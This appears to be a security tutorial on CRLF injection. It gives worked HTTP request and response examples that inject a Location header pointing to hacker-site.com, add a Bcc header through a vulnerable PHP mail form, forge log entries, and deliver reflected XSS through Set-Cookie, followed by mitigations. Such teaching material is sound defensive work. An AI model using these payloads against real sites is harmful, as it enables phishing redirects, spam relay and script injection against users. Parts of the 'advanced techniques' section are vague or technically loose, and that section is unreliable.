# CRLF Injection

<p align="justify">CRLF (Carriage Return Line Feed) injection is a web application vulnerability that occurs when an attacker can inject malicious CRLF characters into an HTTP response. This vulnerability can lead to various security issues, such as HTTP header injection, HTTP response splitting, session fixation, cross-site scripting (XSS), and cache poisoning.</p>

### Understanding the CRLF Injection
To understand CRLF injection, let’s break down the term:

* Carriage Return (CR): It is a control character (ASCII code 13) that instructs the cursor to return to the beginning of the current line.
* Line Feed (LF): It is a control character (ASCII code 10) that instructs the cursor to move to the next line.

<p align="justify"> In the context of HTTP, CRLF refers to the sequence of both CR and LF characters (“\r\n”). These characters are used to separate lines in the HTTP protocol.</p>

<p align="justify"> The CRLF injection vulnerability arises when user-controlled data (input) is not properly sanitized or validated before being used in constructing an HTTP response. Attackers exploit this vulnerability by injecting CRLF characters into user input to manipulate the HTTP response.</p>

### Discovery

To find a CRLF vulnerability, you want to logically think about where in the web application user input would be:

* Reflected as a header (cookies, redirects)
* Included in a file (logs)
* Included in a server-side request (email, server-side HTTP request)
* To include a CRLF in a URL parameter, use these URL-encoded values:

<b> Carriage return: %0d </b>

<b> Line feed: %0a </b>

### Exploitation

#### Exploiting automatic directory completion

<p align="justify"> The most common place I’ve found CRLF injection is when you request a website directory without a leading “/” and the website redirects you to a URL with a leading “/” like this: </p>

````
GET /helloworld <-- no slash HTTP/1.1
Host: site.com
Accept: application/json

↓

HTTP/1.1 301 Moved Permanently
Location: /hello-world/ <-- slash
We can use CRLF to inject a custom header like so:

GET /helloworld%0d%0aLocation%3A%20https%3A%2F%2Fhacker-site.com HTTP/1.1
Host: site.com
Accept: application/json

↓

HTTP/1.1 302 Found
Location: /hello-world
Location: https://hacker-site.com/
Payload: /helloworld<CRLF>Location: https://hacker-site.com

````

Any user that clicks that URL will be redirected to an attacker server instead of /hello-world.

#### Exploiting redirections

<p align="justify">Another common place where I’ve found these are redirects. It is a great day when you find an open redirect vulnerability and CRLF injection from the same endpoint.</p>

Here we have an API that redirects you to another website using the Location: header:

````

GET /api/redirect?url=https%3A%2F%2Fsite.com%2Fhello-word HTTP/1.1
Host: site.com
Accept: application/json

↓

HTTP/1.1 302 Found
Location: https://site.com/hello-world
Then we can inject a custom location header into the URL parameter:

GET /api/redirect?url=%2Fhello-world%0d%0aLocation%3A%20https%3A%2F%2Fhacker-site.com HTTP/1.1
Host: site.com                       ↑ CRLF
Accept: application/json

↓

HTTP/1.1 302 Found
Location: /hello-world
Location: https://hacker-site.com/
Payload: /hello-world<CRLF>Location: https://hacker-site.com

````

Once again, the user has been redirected to the hacker’s website!

#### Email injection

<p align="justify">If user input that is passed into an email or its headers isn’t validated and sanitized properly, it’s possible to use CRLF to inject custom headers into the email headers.</p>

Here’s a PHP script that is vulnerable to email injection:

````
<?php

$name = $_POST['name'];
$replyto = $_POST['replyTo'];
$message = $_POST['message'];
$to = 'root@localhost';
$subject = 'Random subject';

$headers = "From: $name \n" .
"Reply-To: $replyto";
mail($to, $subject, $message, $headers);
?>
How the feedback was meant to be used:

POST /feedback.php HTTP/1.1
Host: site.com
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Content-Length: 67

name=peter&replyTo=peter%40serious.bznes&message=Serious%20message.
````

<p align="justify">To begin exploiting this, let’s take a look at what headers we could inject: https://www.rfc-editor.org/rfc/rfc4021.html . A very juicy one that I found is “Bcc”, it’s a header used to specify multiple email recipients. A perfect candidate for this exploit!</p>

Here are the current email headers:

From: peter
Reply-To: peter@serious.bznes
Let’s inject a Bcc header into the “name” parameter:

````
POST /feedback.php HTTP/1.1
Host: site.com
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Content-Length: 121

name=peter%0d%0aBcc%3A%20notaniceguy%40company.com&replyTo=peter%40serious.bznes&message=You're%20not%20a%20nice%20guy%20%3A(
Payload: peter<CRLF>Bcc:notaniceguy@company.com
````

Now the email headers look like this:

````
From: peter
Bcc:notaniceguy@company.com
Reply-To: peter@serious.bznes
By all logic, the feedback message should’ve gone to both the admin of the site and notaniceguy@company.com.
````

#### Log injection

<p align="justify"> In log injection, an attacker can inject custom messages into logs by using the CRLF characters. This could be done to raise false alarms and make the server administrators waste their time on bogus alerts.</p>

Let’s say someone at the company has created his very own logging framework that puts all login attempts into logins.log in this format:

````
<time>:<user>:<correct credentials?>

1708853728374:peter:False
1708853743574:peter:True
````
We could enter this as a username to trick the admin into believing his account was logged into at a specific time:

````
peter:False%0d%0a1708853860227:admin:True
````
This is what the logs would look like after the injection (without the dashes ofc):

````

1708853728374:peter:False
1708853743574:peter:True
_________________________
1708853860027:peter:False|---> OUR PAYLOAD
1708853860227:admin:True |
-------------------------

````

#### Reflected XSS

<p align="justify">Some sites may add a cookie to the browser based on user input. An example of this would be taking in the parameter “?language=en-US” and then storing it as a cookie (in a HTTP response, not in JS). If no sanitization is done, this could leave the user open to XSS.</p>

````
GET /language?lang=en-US HTTP/1.1
Host: site.com
Accept: text/html

↓

HTTP/1.1 301 Moved Permanently
Location: /
Set-Cookie: lang=en-US;
````

Here’s a payload we can use to exploit this:

en-US;<CRLF>Content-Type: text/html<CRLF>Content-Length:25<CRLF><CRLF><script>alert(1)</script>
This is what it would look like in action:

````

GET /language?lang=en-US%3B%3C%0d%0a%3EContent-Type%3A%20text%2Fhtml%3C%0d%0a%3EContent-Length%3A25%3C%0d%0a%0d%0a%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: site.com
Accept: text/html

↓

HTTP/1.1 301 Moved Permanently
Location: /
Set-Cookie: lang=en-US;
Content-Type: text/html
Content-Length:25

<script>alert(1)</script>;

````
Automation
The only tool I found for automating CRLF injection discovery: <b>https://github.com/Raghavd3v/CRLFsuite**</b>

## Advanced Techniques for CRLF Injection Attacks

* Using Unicode Encoding

<p align="justify">Advanced CRLF attackers often employ character encoding techniques to evade detection. One such method is the use of Unicode encoding. By representing CRLF characters as Unicode code points (e.g., %0D%0A), attackers can bypass simple filters and slip unnoticed into the application’s input.</p>p>

<p align="justify">Mitigation → Security professionals need to implement more robust input validation and decoding techniques capable of identifying and blocking Unicode-encoded CRLF injections.</p>

##### Obfuscation Techniques

<p align="justify">Attackers can obfuscate their CRLF injection payloads by using alternate representations of CRLF characters. For example, using character substitutions, such as URL encoding or HTML encoding, can help hide the attack’s intent from simple pattern-matching security filters.</p>

Mitigation → Security measures should include the ability to decode and identify obfuscated CRLF characters within input data and actively block them.

##### Null Bytes and Overflows

<p align="justify"> In advanced CRLF injection, attackers sometimes leverage null bytes (%00) and buffer overflows to manipulate application behavior and data integrity. These techniques can lead to unpredictable and severe vulnerabilities, making them even harder to detect and mitigate.

Mitigation → Implement strict input validation and filtering to block null bytes and prevent buffer overflows. Regular code audits and penetration testing can help identify potential issues in your application.</p>

##### Mixed Injection Attacks

<p align="justify">Advanced CRLF attackers may combine CRLF injection with other vulnerabilities like Cross-Site Scripting (XSS) or SQL injection, making detection even more challenging. These mixed attacks can lead to broader exploitation of the target system</p>

Mitigation → Organizations must adopt a holistic approach to security, addressing various vulnerabilities through a combination of security measures, including Web Application Firewalls (WAFs), Content Security Policies (CSPs), and strict input validation.

##### Time-Based Attacks

<p align="justify">In time-based CRLF injection attacks, attackers inject CRLF characters to manipulate time-based functions within the application. This can be used to slow down or accelerate processes, making the attack difficult to detect and trace.</p>

Mitigation → Implement security headers and practices like HTTP Strict Transport Security (HSTS) and rate limiting to reduce the impact of time-based attacks.

##### Blind CRLF Injection

<p align="justify">Blind CRLF injection attacks do not produce any visible changes to the application’s response. Attackers inject CRLF characters to tamper with headers or session tokens without triggering visible consequences, making them challenging to detect.</p>

<p align="justify">Mitigation → Employ advanced logging and monitoring systems that can track and identify suspicious activities even when they don’t produce immediately visible changes in the application.</p>

<p align="justify">Advanced CRLF injection attacks present a significant challenge to web security. While the basics of CRLF injection are relatively well understood and defended against, advanced techniques require a more comprehensive and sophisticated security approach. Organizations should continuously update their security measures, including input validation, logging, monitoring, and awareness programs, to guard against these advanced CRLF injection techniques.</p>

## Defense Mechanisms Against CRLF Injection

* Input Validation and Sanitization
<p align="justify">The first line of defense is rigorous input validation. Inputs should be validated against a strict set of rules — for instance, alphanumeric characters only for certain fields. Inputs containing control characters like CR (carriage return) and LF (line feed) should be rejected or sanitized.</p>

<p align="justify">Example: Suppose a user submits a profile name. The server should check if the name contains any disallowed characters and either reject the input or remove/encode the characters before using it in any response.</p>

* Encoding and Escaping
<p align="justify">When input is reflected in headers or web pages, it should be encoded. For HTML, use HTML entity encoding. For URL parameters, use URL encoding.</p>

Example: For the earlier CRLF injection attempt:

````
<http://vulnerable-website.com/login?redirect=%0d%0aSet-Cookie:sessionid=evilcookie>
The server should encode the %0d%0a to prevent it from being interpreted as a CRLF sequence by the web server.
````

* Use of Security Headers
<p align="justify">Implementing security headers like Content-Security-Policy can help mitigate the impact of XSS attacks that may arise from CRLF vulnerabilities.</p>

<p align="justify">Example: A Content-Security-Policy header can restrict resources the browser is allowed to load, preventing the execution of malicious scripts even if an attacker successfully injects script code into the page.</p>

* Utilizing Frameworks and Libraries
<p align="justify">Many modern web frameworks and libraries have built-in mechanisms to automatically handle potentially dangerous input.</p>

<p align="justify">Example: Frameworks like Ruby on Rails or Django automatically escape output and offer functions to handle URL generation without the risk of CRLF injection.</p>

* Regular Security Audits
<p align="justify">Conducting regular security audits and penetration tests can help identify and patch vulnerabilities before attackers can exploit them.</p>

<p align="justify">Example: A penetration tester might use automated tools and manual testing to try and inject CRLF sequences into your application, helping to discover unhandled input vectors.</p>

* Keeping Software Updated
<p align="justify">Ensure all components of the web stack, including server software, frameworks, and libraries, are kept up-to-date with the latest security patches.</p>

<p align="justify">Example: Apply patches and updates to web servers like Apache or Nginx, which might contain fixes for known vulnerabilities that could be exploited in conjunction with CRLF injection attacks.</p>

* Logging and Monitoring
<p align="justify">Monitor logs for unusual activity that could indicate attempted attacks, and have an incident response plan ready.</p>

<p align="justify">Example: Set up alerts for patterns that resemble URL-encoded CRLF sequences in the server logs. This can serve as an early warning system for attempted CRLF injections.</p>
<p align="justify">By implementing these strategies, organizations can significantly reduce the risk of CRLF injection attacks. Security is an ongoing process, and staying informed about potential vulnerabilities and emerging threats is crucial.</p>



